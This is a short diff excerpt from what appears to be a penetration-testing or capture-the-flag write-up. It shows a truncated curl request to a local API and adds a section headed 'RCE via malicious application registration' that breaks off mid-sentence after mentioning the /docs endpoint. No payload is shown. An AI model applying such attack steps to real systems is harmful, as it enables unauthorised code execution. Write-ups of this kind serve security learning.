@@ -424,3 +424,8 @@ curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: applicatio
 
 It allows me to authenticate!
 
+# RCE via malicious application registration
+
+![](Pasted%20image%2020260822203158.png)
+
+So i can reach the `/docs` endpoint in my browser and read through this section, this tell
